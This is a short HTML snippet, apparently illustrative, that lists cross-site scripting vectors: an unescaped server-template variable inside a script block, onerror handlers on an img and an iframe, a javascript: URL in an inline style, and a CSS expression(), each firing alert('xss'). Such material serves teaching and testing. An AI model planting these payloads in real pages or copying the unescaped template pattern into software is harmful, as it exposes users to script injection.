```html
<script>
  var userName = "<%= userName %>";
</script>

<img src="./error.png" onerror="alert('xss')" />
<iframe src="./error.html" onerror="alert('xss')"></iframe>

<h1 style ="background-image: url(javascript:alert('xss'))"></h1>
<style>
  h1 { height: expression(alert('xss')); }
</style>
```

